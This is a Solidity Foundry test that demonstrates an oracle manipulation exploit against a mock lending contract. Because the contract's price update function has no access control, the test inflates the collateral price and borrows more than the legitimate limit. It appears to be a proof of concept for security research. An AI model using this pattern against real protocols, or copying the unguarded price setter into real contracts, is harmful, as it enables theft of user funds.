// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/mocks/MockERC20.sol";
import "../src/mocks/MockLending.sol";

/**
 * @title OracleManipulationTest
 * @notice Proves the `oracle_manipulation` template inline: the lending
 *         protocol reads a single writable price, so the attacker inflates it
 *         and borrows more than legitimately possible.
 */
contract OracleManipulationTest is Test {
    MockERC20 public col;
    MockERC20 public debt;
    MockLending public lending;

    function setUp() public {
        col = new MockERC20("COL", "COL");
        debt = new MockERC20("DEBT", "DEBT");
        lending = new MockLending(address(col), address(debt));

        debt.mint(address(lending), 100_000 ether);

        // attacker deposits 100 collateral (worth 100 at rate 1)
        col.mint(address(this), 100 ether);
        col.approve(address(lending), type(uint256).max);
        lending.depositCollateral(address(col), 100 ether);
    }

    function testOracleManipulation() public {
        // legitimate max borrow at 150% collateral ratio
        uint256 legitMax = uint256(100 ether) * 2 / 3;

        // anyone can move the price (no access control) -> 2x collateral value
        lending.updatePrice(2 ether, 1 ether);

        // attacker borrows 100 — impossible without the manipulated price
        lending.borrow(address(debt), 100 ether);

        assertEq(lending.debt(address(this)), 100 ether, "over-borrowed");
        assertGt(100 ether, legitMax, "borrowed more than legitimately possible");
    }
}
